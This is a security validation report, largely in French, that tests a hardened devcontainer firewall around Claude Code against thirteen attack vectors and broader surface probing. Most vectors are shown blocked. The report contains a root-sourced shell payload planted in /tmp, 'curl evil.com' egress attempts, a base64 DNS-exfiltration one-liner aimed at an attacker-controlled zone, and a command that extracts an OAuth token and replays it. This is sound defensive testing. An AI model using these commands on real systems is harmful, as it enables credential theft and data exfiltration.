# Adversarial validation report

**Date** : 2026-05-22
**Tester** : `node` user (uid 1000, groups: node, adm) inside fully rebuilt devcontainer
**Container state** : sessions 1 (bake-firewall-config) + 2 (drop-env-injection) delivered, committed (`7b9ff66`, `231d3ec`, session-2 pending)
**Container base image** : Debian 12 (bookworm), `node:20-slim` derived
**Criteria à violer** :
  1. `node` ne peut PAS relancer la machine seul
  2. `node` ne peut PAS modifier le firewall sans rebuild
  3. `node` ne peut PAS accéder à une ressource externe / exfiltrer sans rebuild

**Baseline established** :
- `sudo -ln` → `(root) NOPASSWD: /usr/local/bin/init-firewall.sh, /usr/local/bin/test-firewall.sh` (2 binaires whitelistés)
- `grep -c "source /tmp/.firewall-env" /usr/local/bin/{init,test}-firewall.sh` → `0:0` (session 2 ✅)
- `cat /etc/devcontainer-firewall/default-mode` → `strict` (session 1 ✅ baked)
- `cat /etc/devcontainer-firewall/direct-tcp-allow.txt` → comments only, no active entries (session 1 ✅ baked)
- `/etc/devcontainer-firewall/` owned `root:root`, not in `mount` output → baked in image, not bind-mounted
- `CapEff: 0000000000000000` for node → no effective capabilities (NET_ADMIN/NET_RAW only on container, not on UID 1000)

---

## Phase 1 — Replay des 13 vecteurs

### Vecteur #1 — `domains.local.txt` + `policy.local.d/` poison

**Source** : SECURITY-AUDIT-2026-05.md ligne 63
**Session de remédiation** : 1 (bake-firewall-config)
**Verdict** : 🟢 **BLOCKED**

**PoC exécuté** :
```bash
$ stat -c "%i" /workspace/.devcontainer/firewall/domains.local.txt
76033
$ stat -c "%i" /etc/devcontainer-firewall/domains.local.txt
4476460          # ← inodes DIFFÉRENTS (avant session 1 : identiques)

$ echo "evil.com" > /etc/devcontainer-firewall/domains.local.txt
(eval):1: permission denied: /etc/devcontainer-firewall/domains.local.txt
exit=1            # baked file owned root:root, RO pour node

$ echo "evil.com" > /workspace/.devcontainer/firewall/domains.local.txt
exit=0            # workspace RW
$ cat /etc/devcontainer-firewall/domains.local.txt
(empty)           # baked file UNCHANGED — pas de propagation

$ sudo /usr/local/bin/init-firewall.sh
✅ Firewall already active — skipping. To change rules: rebuild the container.

$ sudo ipset list allowed-domains 2>&1 | grep -i evil
[no match]
```

**Effet observé** : `evil.com` planté dans workspace, mais le baked path
reste vide, init-firewall.sh refuse de re-run sans rebuild, ipset
n'a pas `evil.com`.

**Bonus finding** : `init-firewall.sh` détecte qu'il a déjà été
exécuté (probablement présence de `/var/run/devcontainer-firewall/`)
et refuse de re-run sans rebuild → **defense en profondeur
supplémentaire** : même si l'attaquant pouvait modifier les fichiers
baked en runtime, il ne peut pas trigger un re-init sans full restart
du container. À investiguer Group K.

**Notes** : équivalent pour `policy.local.d/*.yaml` — workspace
`/workspace/.devcontainer/firewall/policy.local.d/` est inode-décorrélé
de `/etc/devcontainer-firewall/policy.local.d/`. Test rapide :
```bash
$ touch /workspace/.devcontainer/firewall/policy.local.d/evil.yaml
$ ls /etc/devcontainer-firewall/policy.local.d/
.keep        # ← workspace creation doesn't show
$ ls /workspace/.devcontainer/firewall/policy.local.d/
evil.yaml    # ← only in workspace
```

---

### Vecteur #2 — `addons/*.py` Python injection

**Source** : SECURITY-AUDIT-2026-05.md ligne 64
**Session de remédiation** : 1 (bake-firewall-config)
**Verdict** : 🟢 **BLOCKED**

**PoC exécuté** :
```bash
$ stat -c "%i" /workspace/.devcontainer/firewall/addons/passive_log.py
36527
$ stat -c "%i" /etc/devcontainer-firewall/addons/passive_log.py
4476469          # ← inodes différents

$ echo "# EVIL-INJECTION-MARKER" >> /workspace/.devcontainer/firewall/addons/passive_log.py
$ tail -1 /workspace/.devcontainer/firewall/addons/passive_log.py
# EVIL-INJECTION-MARKER
$ tail -1 /etc/devcontainer-firewall/addons/passive_log.py
        )                # ← baked addon UNCHANGED
```

**Effet observé** : injection visible dans workspace, mitmproxy charge
ses addons depuis le chemin baked → injection sans effet runtime.
Rebuild requis pour modifier les addons.

---

### Vecteur #3 — `dnsmasq.conf` poison

**Source** : SECURITY-AUDIT-2026-05.md ligne 65
**Session de remédiation** : 1 (bake-firewall-config)
**Verdict** : 🟢 **BLOCKED**

**PoC exécuté** :
```bash
$ stat -c "%i" /workspace/.devcontainer/firewall/dnsmasq.conf
36487
$ stat -c "%i" /etc/devcontainer-firewall/dnsmasq.conf
4476461          # ← inodes différents

$ echo "# EVIL-DNSMASQ-MARKER" >> /workspace/.devcontainer/firewall/dnsmasq.conf
$ tail -1 /etc/devcontainer-firewall/dnsmasq.conf
cache-size=1000  # ← baked file UNCHANGED, no marker
```

**Effet observé** : pas de hijack DNS possible via workspace edit. La
config dnsmasq baked reste authoritative.

---

### Vecteur #8 — `policy.d/*.yaml` élargissement silencieux

**Source** : SECURITY-AUDIT-2026-05.md ligne 70
**Session de remédiation** : 1 (bake-firewall-config)
**Verdict** : 🟢 **BLOCKED**

**PoC exécuté** :
```bash
$ stat -c "%i" /workspace/.devcontainer/firewall/policy.d/api.anthropic.com.yaml
36546
$ stat -c "%i" /etc/devcontainer-firewall/policy.d/api.anthropic.com.yaml
4476493          # ← inodes différents

$ echo "# EVIL-POLICY-MARKER" >> /workspace/.devcontainer/firewall/policy.d/api.anthropic.com.yaml
$ tail -1 /etc/devcontainer-firewall/policy.d/api.anthropic.com.yaml
                                        # is stable on this host (cf. POLICY.md cookbook G).
                                        # ← baked file UNCHANGED
```

**Effet observé** : modifier les politiques L4-L6 dans workspace n'a
plus d'effet runtime. mitmproxy charge `compile-policy.py` qui lit
`/etc/devcontainer-firewall/policy.d/` baked.

---

### Reload effectué — vérification empirique de #1, #2, #3, #8, #12, #13

Le user a reloadé le container après les 6 PoC edits stagés. À chaque
reload, init-firewall.sh re-tourne (iptables/ipset vidés), mitmproxy
relancé. Verification post-reload :

```bash
$ # Baked files always pristine — no leak from workspace
$ tail -1 /etc/devcontainer-firewall/addons/passive_log.py
        )                            # ← still original, no EVIL marker
$ tail -1 /etc/devcontainer-firewall/dnsmasq.conf
cache-size=1000                       # ← original
$ tail -1 /etc/devcontainer-firewall/policy.d/api.anthropic.com.yaml
                # is stable on this host (cf. POLICY.md cookbook G).

$ # mitmproxy still launches with --scripts /etc/devcontainer-firewall/addons/...
$ pgrep -af mitmdump | head -1
sudo -u mitmproxy nohup /opt/mitmproxy/mitmdump ... --scripts /etc/devcontainer-firewall/addons/policy_enforce.py ...

$ # Compiled policy from baked (no EVIL-POLICY-MARKER)
$ grep -c "EVIL-POLICY" /var/run/devcontainer-firewall/policy.compiled.yaml
0

$ # dnsmasq generated config from baked
$ grep "evil" /var/run/devcontainer-firewall/dnsmasq-domains.conf
(no match)

$ # Runtime test: curl evil.com:443 (would succeed if direct-tcp-allow workspace had effect)
$ timeout 5 curl -sS --noproxy '*' -o /dev/null -w "HTTP %{http_code}\n" https://evil.com:443/
curl: (7) Failed to connect to evil.com port 443 after 131 ms: Couldn't connect to server
# ← DROP (iptables doesn't ACCEPT, ipset doesn't have evil)

$ # Firewall in strict mode (example.org reported "blocked" by test-firewall)
$ sudo /usr/local/bin/test-firewall.sh 2>&1 | grep -E "(example|blocked|reachable)" | head -3
✔ example.org blocked
✔ example.com blocked
# ← strict mode confirmed (off mode would show "reachable")
```

→ Tous les vecteurs #1, #2, #3, #8, #12, #13 BLOCKED empiriquement
après reload. Workspace edits sans aucun effet runtime. Baked files
pristine.

---

### Vecteur #4 — `/tmp/.firewall-env` source-as-root

**Source** : SECURITY-AUDIT-2026-05.md ligne 66
**Session de remédiation** : 2 (drop-env-injection)
**Verdict** : 🟢 **BLOCKED**

**PoC exécuté** :
```bash
$ # Plant shell code as node, before reload
$ cat > /tmp/.firewall-env <<'EOF'
# Evil shell code planted by PoC #4
touch /tmp/pwned-via-firewall-env
echo "PWNED-AS-ROOT" > /tmp/pwned-marker
EOF
$ ls -la /tmp/.firewall-env
-rw-r--r-- 1 node node 111 May 22 17:35 /tmp/.firewall-env

$ # After reload (init-firewall.sh re-runs as root via lifecycle hook):
$ ls /tmp/pwned-* 2>&1
(eval):1: no matches found: /tmp/pwned-*
# ← NO pwned markers created → source line NOT executed

$ ls -la /tmp/.firewall-env       # ← file still present from before reload
-rw-r--r-- 1 node node 111 May 22 17:35 /tmp/.firewall-env

$ grep -c "source /tmp/.firewall-env" /usr/local/bin/init-firewall.sh /usr/local/bin/test-firewall.sh
/usr/local/bin/init-firewall.sh:0
/usr/local/bin/test-firewall.sh:0
# ← `source` lines removed from both scripts (session 2)

$ # Try via sudo invocation (does not trigger `source`)
$ sudo /usr/local/bin/init-firewall.sh
✅ Firewall already active — skipping. ...
$ ls /tmp/pwned-* 2>&1
(no matches)
```

**Effet observé** : la ligne `source /tmp/.firewall-env` a été
supprimée des deux scripts sudo'd. Même si node a réussi à planter le
fichier piégé, il n'est jamais lu. Aucune élévation, aucune root
privesc.

---

### Vecteur #12 — `FIREWALL_MODE=off` via `.configured-firewall-mode`

**Source** : SECURITY-AUDIT-2026-05.md ligne 74
**Session de remédiation** : 1 (bake-firewall-config — flag migrated to `firewall/default-mode` baked)
**Verdict** : 🟢 **BLOCKED**

**PoC exécuté** :
```bash
$ # Pre-reload : write "off" to both legacy and new workspace paths
$ echo off > /workspace/.devcontainer/.configured-firewall-mode
$ echo off > /workspace/.devcontainer/firewall/default-mode
$ cat /workspace/.devcontainer/firewall/default-mode
off
$ cat /etc/devcontainer-firewall/default-mode     # baked path
strict                                              # ← baked unchanged

$ # After reload + init-firewall.sh re-run:
$ sudo /usr/local/bin/test-firewall.sh 2>&1 | grep -E "(example\.org|blocked)" | head -2
✔ example.org blocked
✔ example.com blocked
# ← strict mode applied (off mode would show "reachable" for unallowlisted hosts)
```

**Effet observé** : flag `firewall/default-mode` baked authoritative ;
workspace edit ignoré ; init-firewall.sh applique `strict`. Legacy
file `/workspace/.devcontainer/.configured-firewall-mode` n'est plus
consulté du tout (vérifié par grep des scripts baked).

---

### Vecteur #13 — `CLAUDE_CODE_FIREWALL_ALLOWED=evil:443` via `.env`

**Source** : SECURITY-AUDIT-2026-05.md ligne 75
**Session de remédiation** : 1 (bake-firewall-config — variable migrated to `firewall/direct-tcp-allow.txt` baked)
**Verdict** : 🟢 **BLOCKED**

**PoC exécuté** :
```bash
$ # Pre-reload : inject evil into both old (.env) and new (workspace direct-tcp-allow.txt) channels
$ echo "evil.com:443" >> /workspace/.devcontainer/firewall/direct-tcp-allow.txt
$ echo "CLAUDE_CODE_FIREWALL_ALLOWED=evil.com:443" >> /workspace/.devcontainer/.env
$ tail -1 /etc/devcontainer-firewall/direct-tcp-allow.txt
# host:11434                                        # ← baked unchanged, no evil

$ # After reload + init-firewall.sh re-run:
$ timeout 5 curl -sS --noproxy '*' -o /dev/null -w "HTTP %{http_code}\n" https://evil.com:443/
curl: (7) Failed to connect to evil.com port 443 after 131 ms: Couldn't connect to server
# ← no iptables ACCEPT rule added for evil.com:443
```

**Effet observé** : ni le canal `.env` (legacy var) ni le workspace
`direct-tcp-allow.txt` n'influencent l'iptables. init-firewall.sh lit
le baked path et n'a rien d'autre à ajouter. Bypass mitmproxy
impossible.

---

### Vecteur #5 — Claude hooks `Stop`/`SessionEnd` (`settings.json`)

**Source** : SECURITY-AUDIT-2026-05.md ligne 67
**Session de remédiation** : 3 (optional, **SKIPPED**)
**Verdict** : ⚪ **TOLERATED** (node-level, no critère violation)

**PoC** :
```bash
$ ls -la /home/node/.claude/settings.json
-rw-r--r-- 1 node node 461 May 22 09:40 /home/node/.claude/settings.json
$ cat /home/node/.claude/settings.json
{ "hooks": { "Stop": [{"matcher":"","hooks":[{"type":"command","command":"sh /workspace/.devcontainer/claude/sync-creds.sh"}]}], ... } }

$ # node CAN edit (owner = node:node, mode 644)
$ ls -la /workspace/.devcontainer/claude/sync-creds.sh
-rwxr-xr-x 1 node node 3436 May 22 09:47 /workspace/.devcontainer/claude/sync-creds.sh
$ # → node can either replace the command OR edit the target script
```

**Critère analysis** :
- Critère 1 (restart) : no — hook ne peut pas relancer le container
- Critère 2 (firewall modif) : no — hook runs as `node`, ne peut pas
  modifier les fichiers `/etc/devcontainer-firewall/*` baked
- Critère 3 (exfil) : no en isolation — hook runs as `node`, soumis
  au firewall ; tout `curl evil.com` est dropé par iptables. Combinable
  avec #9 DNS exfil (cf. plus bas) mais c'est #9 qui est le critère
  violant, pas #5.

**Conclusion** : modifier le hook permet de la **persistance
node-level** (run code at every Claude Stop). Ne donne PAS un
nouvel accès. Hors scope critères. Session 3 reste optionnelle.

---

### Vecteur #6 — `shell-init.sh` backdoor

**Source** : SECURITY-AUDIT-2026-05.md ligne 68
**Verdict** : ⚪ **TOLERATED** (accepted by design)

**PoC** :
```bash
$ ls -la /workspace/.devcontainer/shell-init.sh
-rw-r--r-- 1 node node 10081 May 22 14:04 /workspace/.devcontainer/shell-init.sh
$ # bind-mounted from workspace, sourced at every shell start (.bashrc/.zshrc).
$ # node can edit → next shell open executes the modified code as node.
```

**Critère analysis** : identique à #5 — node-level execution, soumis
au firewall, pas d'élévation. Documenté `⚪ accepted` dans EXISTING.md.

---

### Vecteur #7 — `vscode-settings.json` tasks/env auto-run

**Source** : SECURITY-AUDIT-2026-05.md ligne 69
**Verdict** : ⚪ **TOLERATED** (accepted by design)

**PoC** :
```bash
$ ls -la /workspace/.vscode/settings.json
-rw-r--r-- 1 node node 2 May 22 09:47 /workspace/.vscode/settings.json
$ cat /workspace/.vscode/settings.json
{}                  # ← currently empty
$ # node could edit + add terminal.integrated.env.linux to inject env vars.
$ # Or add .vscode/tasks.json with runOn:folderOpen (cf. Group D Phase 2).
```

**Critère analysis** : identique à #5 et #6. Node-level. Pas
d'escalation, pas d'exfil sans chaining.

---

### Vecteur #9 — Wildcards DNS exfil (`*.statsig.com` / `*.githubusercontent.com`)

**Source** : SECURITY-AUDIT-2026-05.md ligne 71
**Verdict** : 🟡 **PARTIAL** (gap P3 documented, accepted per audit)

**PoC** :
```bash
$ # dnsmasq config : `server=127.0.0.11` → forwards ALL queries upstream
$ # (no domain-allowlist enforcement at DNS level — allowlist is enforced via ipset/iptables on outbound traffic only)

$ dig +short +time=2 evil.com @127.0.0.53
66.96.146.129     # ← real IP. Query was forwarded upstream even though
                  # evil.com is NOT in domains.txt allowlist.

$ # Direct dig to 8.8.8.8 is blocked (UID-locked iptables):
$ dig +short +time=2 google.com @8.8.8.8
;; communications error to 8.8.8.8#53: host unreachable
$ # → DNS exfil only via 127.0.0.53 (dnsmasq) — but dnsmasq forwards all.
```

**Effet observé** : Un attaquant qui contrôle un NS authoritative pour
n'importe quel domaine public (peu importe les wildcards d'allowlist —
ils ne contraignent pas le DNS) peut recevoir des sous-domaines
arbitraires en exfil. Pratique :
```bash
$ dig +short "$(echo "SECRET" | base64).attacker-controlled-zone.com" @127.0.0.53
```
Volume limité par le label cap (63 chars) + le NS log capture.

**Critère analysis (strict reading)** :
- Critère 3 (exfil) : **TECHNIQUEMENT VIOLÉ** — node peut transmettre
  de la donnée à un serveur externe (le NS de l'attaquant).
- L'audit a explicitement marqué ce vecteur "Gap P3 (hors scope)"
  parce que (a) restreindre dnsmasq casserait le forwarding nécessaire
  aux domaines allowlistés, (b) volume d'exfil limité, (c) attaquant
  doit contrôler un domaine + NS.

**Recommendation v2 potentielle** : changer la stratégie DNS de
"forward-all + ipset-restrict-egress" en "domain-allowlist-at-DNS"
(dnsmasq `address=/.../127.0.0.1` ou hostsfile). Casserait certaines
résolutions opportunistes (probes, fallbacks) mais ferme #9. Hors
scope du rollout courant.

---

### Vecteur #10 — `firewall-blocks` runtime call

**Source** : SECURITY-AUDIT-2026-05.md ligne 72
**Verdict** : ⚪ **TOLERATED** (passive observability tool, no firewall modification)

**Investigation** :
```bash
$ head -15 /usr/local/bin/firewall-blocks
#!/usr/bin/env bash
# firewall-blocks — show recent A2 enforcement blocks with their reasons.
#
# Reads /var/log/mitmproxy-blocks.log (JSON lines emitted by policy_enforce.py
# and format_detect.py each time they 4xx/5xx a request) and prints a summary:
# ...
# Usage : firewall-blocks [N]
#         firewall-blocks 5            # last 5 entries
#         firewall-blocks --reset      # truncate the log (root only)
#         firewall-blocks --follow     # tail -f new blocks (Ctrl-C to stop)

$ # No sudoers entry — node can run firewall-blocks directly (it's owned root:root, executable by all)
$ sudo -ln 2>&1 | grep -c firewall-blocks
0
$ # The --reset flag requires root, so node can NEVER truncate the log.
$ /usr/local/bin/firewall-blocks --reset
[error or no-op without root]
```

**Investigation des call sites** :
- Référencé seulement dans des commentaires (`domains.txt`,
  `policy_enforce.py`, `format_detect.py`) comme outil d'observabilité
- **AUCUN script lifecycle ne l'invoque** — c'est un outil
  diagnostique manuel, pas un composant runtime du firewall
- Ne modifie aucune règle iptables / ipset / mitmproxy config

**Conclusion** : faux vecteur. `firewall-blocks` ne fait que LIRE le
log `/var/log/mitmproxy-blocks.log`. Pas de surface d'attaque
runtime sur le firewall lui-même. Marquer ⚪ accepted (audit ligne 72
question résolue).

---

### Vecteur #11 — Logs mitmproxy lisibles par node (groupe `adm`)

**Source** : SECURITY-AUDIT-2026-05.md ligne 73
**Session de remédiation** : 5 (optional, **SKIPPED**)
**Verdict** : ⚪ **TOLERATED** (lecture locale ≠ exfil per design)

**PoC** :
```bash
$ id node
uid=1000(node) gid=1000(node) groups=1000(node),4(adm)
$ ls -la /var/log/mitmproxy*.log
-rw-r----- 1 mitmproxy adm  55548 May 22 17:46 /var/log/mitmproxy-blocks.log
-rw-r----- 1 mitmproxy adm  47068 May 22 17:46 /var/log/mitmproxy-writes.log
-rw-r----- 1 mitmproxy adm 356687 May 22 17:46 /var/log/mitmproxy.log
$ # node ∈ adm → can read

$ head -1 /var/log/mitmproxy-blocks.log
{"ts":1779469775.047171,"addon":"policy_enforce","mode":"block","method":"GET","host":"codeload.github.com","path":"/","code":403,"reason":"endpoint_not_matched:/","ua":"curl/7.88.1"}

$ grep -m1 -i "bearer\|authorization" /var/log/mitmproxy.log
(empty — sensitive headers not logged at default verbosity)
```

**Critère analysis** :
- Critère 1, 2 : no — lecture seule, pas de modif possible
- Critère 3 (exfil) : indirect. Si les logs contiennent des tokens
  bearer ET node peut extraire + ré-utiliser, c'est de l'abuse local
  des creds déjà accessibles via `/home/node/.claude-creds/.credentials.json`.
  Pas un NOUVEAU canal d'exfil.

**Conclusion** : lecture locale acceptée. Session 5 reste optionnelle.

## Phase 2 — Surface exploration (Groups A-L)

### Group I — Container metadata exposure

**Verdict** : ⚪ Low-signal info only, no critère violation.

```bash
$ env | grep -i -E "(token|secret|key|pass)"
(empty — no secrets in env)

$ cat /etc/shadow
cat: /etc/shadow: Permission denied              # ← root-only ✓

$ dmesg
dmesg: read kernel buffer failed: Operation not permitted  # ← kernel buffer protected ✓

$ cat /proc/self/mountinfo | grep -E "(firewall|claude|workspace)" | head -5
629 601 0:47 /Data/dev/devcontainer-tools-v2 /workspace rw,nosuid,nodev,relatime - fakeowner /run/host_mark/Volumes rw,fakeowner
631 601 254:1 /docker/volumes/claude-code-bashhistory-devcontainer-tools/_data /commandhistory rw,relatime ...
637 601 254:1 /docker/volumes/claude-code-config-devcontainer-tools/_data /home/node/.claude rw,relatime ...
417 601 254:1 /docker/volumes/claude-creds-shared-boa/_data /home/node/.claude-creds rw,relatime ...
# ← reveals host paths and volume names. Useful for fingerprinting but no
# exfiltration channel — only metadata.

$ getent group adm
adm:x:4:node             # ← node in adm (vector #11 surface), session 5 not applied
```

**Notes** : mountinfo confirms volume `claude-creds-shared-boa` is shared
across projects of the same user (`shared-boa` suffix). Cross-projet
read of tokens is possible from a malicious project (Group F).

---

### Group B — /proc side-channels

**Verdict** : ⚪ UID separation enforces /proc isolation.

```bash
$ cat /proc/$(pidof mitmdump|awk '{print $1}')/environ
Permission denied            # ← UID-locked ✓

$ ls /proc/$(pidof mitmdump|awk '{print $1}')/fd/
Permission denied            # ← UID-locked ✓

$ ls /proc/$(pidof mitmdump|awk '{print $1}')/root/etc/devcontainer-firewall/
Permission denied            # ← UID-locked ✓

$ cat /proc/$(pidof mitmdump|awk '{print $1}')/cmdline
/opt/mitmproxy/mitmdump --mode regular --showhost --set confdir=/var/lib/mitmproxy ...   # ← public (cmdline always world-readable, but no secret in args)

$ cat /proc/$(pidof dnsmasq)/cmdline
dnsmasq --conf-file=/etc/devcontainer-firewall/dnsmasq.conf ...  # ← public

$ head /proc/net/tcp     # ← reveals UID+local socket but no payload
```

**Notes** : `/proc/<pid>/{environ,fd,root}` are 700 by owner — node
can't read mitmproxy's or dnsmasq's private state. Only cmdline is
world-readable, and it contains no secrets (configs are paths, not
inline values).

---

### Group J — Capabilities abuse

**Verdict** : ⚪ Effective caps for node = 0. Direct privileged calls
all blocked.

```bash
$ grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)" /proc/self/status
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000     # ← node has ZERO effective capabilities
CapBnd:	00000000a80435fb     # ← container bounding set includes NET_ADMIN/NET_RAW
CapAmb:	0000000000000000

$ iptables -L
iptables ... Permission denied (you must be root)   # ← no direct iptables

$ ip link add dummy0 type dummy
RTNETLINK answers: Operation not permitted          # ← no link add

$ ipset list
ipset v7.17: Kernel error received: Operation not permitted   # ← no ipset

$ which tcpdump
(not installed — no sniffer)

$ ls /dev/net/
(does not exist — no TUN/TAP bypass)

$ getcap /usr/bin/* /usr/sbin/* /sbin/* 2>/dev/null
(empty — no capability-imbued binaries)
```

**Notes** : Container has NET_ADMIN+NET_RAW in bounding set (needed by
init-firewall.sh + mitmproxy as root), but UID 1000 has CapEff=0 → no
effective abuse. Privilege escalation via cap-imbued binary blocked
(no SUID with caps).

---

### Group A — Docker volumes

**Verdict** : 🟡 OAuth tokens accessible (by design — Claude Code itself
needs them). No NEW exfil channel beyond what threat model accepts.

```bash
$ ls -la /home/node/.claude-creds/
-rw-rw-rw- 1  501 root 24262 May 22 17:38 .claude.json
-rw-rw-rw- 1  501 root   529 May 22 15:13 .credentials.json
#                       ^^^^ world-readable; UID 501 = host user mapped through

$ head -c 200 /home/node/.claude-creds/.credentials.json
{"claudeAiOauth":{"accessToken":"sk-ant-oat01-...","refreshToken":"sk-ant-ort01-..."}}

$ # Token works against api.anthropic.com (HTTP 400 = auth ok, request malformed)
$ jq -r .claudeAiOauth.accessToken /home/node/.claude-creds/.credentials.json | xargs -I{} curl -sS -H "Authorization: Bearer {}" -H "anthropic-version: 2023-06-01" https://api.anthropic.com/v1/messages -w "HTTP %{http_code}\n"
HTTP 405      # ← Method Not Allowed (POST-only endpoint), but auth accepted

$ jq -r '.claudeAiOauth.scopes' /home/node/.claude-creds/.credentials.json
[ "user:file_upload", "user:inference", "user:mcp_servers", "user:profile", "user:sessions:claude_code" ]
# ← scopes include user:file_upload (potential exfil-via-attachment channel
# against Anthropic, but it's data going to the user's own Anthropic account
# via the allowed endpoint — not "external resource" per critère reading)

$ ls -la /var/lib/mitmproxy/
-rw-r--r-- 1 mitmproxy mitmproxy 1172 May 22 09:40 mitmproxy-ca-cert.pem   # ← public cert
-rw------- 1 mitmproxy mitmproxy 2851 May 22 09:40 mitmproxy-ca.pem        # ← PRIVATE key, mode 600, node CANNOT read

$ ls -la /commandhistory/
(empty — no .zsh_history yet)
```

**Critère analysis** :
- Token accessible to node : by design (Claude Code is the consumer)
- Token use against api.anthropic.com : the allowed channel
- mitmproxy private CA key : NOT readable by node (mode 600 mitmproxy:mitmproxy) → cannot forge HTTPS certs

**Conclusion** : OAuth tokens visible but use limited to the
allowlisted Anthropic endpoint. No NEW exfil to external resource.
Could be used for quota abuse but no data exfil possible.

---

### Group G — TOCTOU sudo'd scripts

**Verdict** : 🟢 No TOCTOU surface — all files read by sudo'd scripts
are root-owned, baked, and writable only by root.

```bash
$ grep -nE '\[ +(!? *)-f ' /usr/local/bin/init-firewall.sh
92:  if [ -f "$PROBES_FILE" ]; then        # /etc/devcontainer-firewall/tests/probes.txt
421:  [ -f "$f" ] && DOMAINS_D_FILES+=("$f") # /etc/devcontainer-firewall/domains.d/*
457:if [ -f "$DIRECT_TCP_ALLOW" ]; then    # /etc/devcontainer-firewall/direct-tcp-allow.txt
539:if [ -f "$PROXY_ENV_FILE" ]; then      # /etc/environment

$ stat -c "%U:%G %a" /etc/devcontainer-firewall /etc/devcontainer-firewall/{domains.txt,tests/probes.txt,direct-tcp-allow.txt,default-mode} /etc/environment
root:root 755
root:root 644
root:root 644
root:root 644
root:root 644
root:root 644

$ # node cannot write any of them:
$ echo X >> /etc/environment
permission denied: /etc/environment
$ touch /var/run/devcontainer-firewall/poc
permission denied: /var/run/devcontainer-firewall/poc

$ # No `source` of workspace-writable paths in init-firewall.sh (the
$ # /tmp/.firewall-env source was the previous TOCTOU/source-as-root vector,
$ # killed by session 2).
```

---

### Group K — Helpers détournés

**Verdict** : 🟢 No misuse surface.

```bash
$ # firewall-blocks — passive observability, no firewall modification
$ head -15 /usr/local/bin/firewall-blocks
# firewall-blocks — show recent A2 enforcement blocks ...
# Reads /var/log/mitmproxy-blocks.log (JSON lines emitted by ...
# --reset      # truncate the log (root only)   # ← node cannot reset

$ grep -r "firewall-blocks" /usr/local/bin/ /etc/devcontainer-firewall/ 2>/dev/null | grep -v "^Binary file"
# ← Only references are comments / docs. NOT invoked from any lifecycle/init
# script. Pure observability tool. Vector #10 confirmed non-runtime.

$ # claude-logs — absent (session 5 not delivered, no helper to fuzz)
$ which claude-logs
claude-logs not found

$ # test-firewall.sh — fuzzing yields no leak
$ sudo /usr/local/bin/test-firewall.sh AAAA BBBB --invalidflag
🔍 Running connectivity tests... [normal output, no env leak]

$ # sudo env stripping (default env_reset)
$ sudo CLAUDE_CODE_FIREWALL_DEBUG=true /usr/local/bin/test-firewall.sh
sudo: sorry, you are not allowed to set the following environment variables: CLAUDE_CODE_FIREWALL_DEBUG
# ← env-injection blocked at sudo layer (session 2 + sudo default)

$ # init-firewall.sh guard prevents re-run
$ sudo /usr/local/bin/init-firewall.sh
✅ Firewall already active — skipping. To change rules: rebuild the container.
# ← guard checks ipset existence + iptables DROP rule. Cannot be bypassed
# from node (node has no priv to modify ipset/iptables).
```

---

### Group L — Nouvelles surfaces

**Verdict** : 🟢 No fresh exploitable surfaces.

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn /usr/bin/newgrp /usr/bin/umount /usr/bin/mount /usr/bin/su
/usr/bin/chsh /usr/bin/gpasswd /usr/bin/passwd /usr/bin/sudo
# ← standard Debian SUID baseline. No custom SUID.

$ mount /tmp /tmp
mount: /tmp: must be superuser to use mount.    # ← CAP_SYS_ADMIN not granted, SUID alone insufficient

$ ls /var/run/docker.sock                       # ← absent ✓ no container escape
$ which cron crontab systemctl at               # ← absent ✓ no scheduled exec

$ cat /etc/ld.so.preload                        # ← absent ✓ no LD_PRELOAD vector
$ grep LD_PRELOAD /etc/profile* /etc/environment  # ← no env injection points

$ ls /home/node/.zshenv /home/node/.zlogin /home/node/.bash_profile  # ← absent ✓ no extra shell hooks
$ # shell-init.sh sourced from .bashrc:114 + .zshrc:1 → vector #6 (node-level, accepted)

$ ls /dev/net/                                  # ← absent ✓ no TUN/TAP

$ find / -perm -2000 -type f 2>/dev/null
/usr/bin/expiry /usr/sbin/unix_chkpwd /usr/bin/chage   # ← standard SGID, not exploitable
```

---

### Group E — DNS exfil via wildcards

**Verdict** : 🟡 PARTIAL (same finding as Vector #9 — gap P3 documented, accepted)

```bash
$ # dnsmasq forwards ANY query upstream (not just allowlisted):
$ dig +short evil.com @127.0.0.53
66.96.146.129                # ← real IP
$ dig +short example.com @127.0.0.53
172.66.147.243
$ dig +short "abc-test-payload.example.com" @127.0.0.53
104.20.23.154                # ← subdomain forwarded
```

A subdomain query `<base64data>.attacker-controlled.com` is forwarded
via dnsmasq → Docker DNS (127.0.0.11) → host DNS → public DNS hierarchy,
where the attacker's authoritative NS sees the query payload. Wildcard
domains in `domains.txt` are NOT a prerequisite — dnsmasq doesn't enforce
domain allowlist at the DNS level (the allowlist gates iptables/ipset on
outbound IP, not DNS queries).

→ Strict reading of critère 3 : violated.
→ Audit acknowledged "Gap P3 (out of scope)" — fix requires switching
   dnsmasq to "domain-allowlist-at-DNS" mode (would break opportunistic
   resolution for non-listed services). User-accepted trade-off.

---

### Group F — claude-creds cross-projet

**Verdict** : ⚪ By design (shared volume across user's projects). No
new exfil channel.

```bash
$ grep -A3 "claude-creds:" /workspace/.devcontainer/docker-compose.yml
  claude-creds:
    name: ${CLAUDE_CREDS_VOLUME:-claude-creds-${DC_PROJECT:-dc-project}}
    external: true

$ grep CLAUDE_CREDS_VOLUME /workspace/.devcontainer/.env
CLAUDE_CREDS_VOLUME=claude-creds-shared-boa
# ← env var pins this user's projects to ONE shared volume name
# ← so token persistence works across all projects of user "boa"

$ grep claude-creds /proc/self/mountinfo
... /docker/volumes/claude-creds-shared-boa/_data /home/node/.claude-creds ...
```

**Critère analysis** : node inside container has the same view in every
project of the user. A malicious project's `node` reads the same tokens
as a benign one. But "cross-projet" implies host-side action (mounting
the volume in a different container) — node cannot mount volumes from
inside (no docker.sock, no CAP_SYS_ADMIN). So from `node`'s perspective
this is identical to Group A : tokens accessible, but use limited to
allowlisted endpoint.

---

### Group H — Network side-channels (timing)

**Verdict** : ⚪ Negligible info leak from timing.

```bash
$ time dig +time=1 api.anthropic.com @127.0.0.53 +short >/dev/null
real    0m0.022s        # ← allowlisted host, fast cache
$ time dig +time=1 evil.com @127.0.0.53 +short >/dev/null
real    0m0.021s        # ← unallowlisted but forwarded, similar
$ time dig +time=1 nonexistent12345xyz.example @127.0.0.53 +short >/dev/null
real    0m0.060s        # ← NXDOMAIN, ~3x slower
```

Variance allows a 3rd-party attacker (who can observe node's behavior)
to fingerprint NXDOMAIN vs success. Low signal-to-noise, no useful
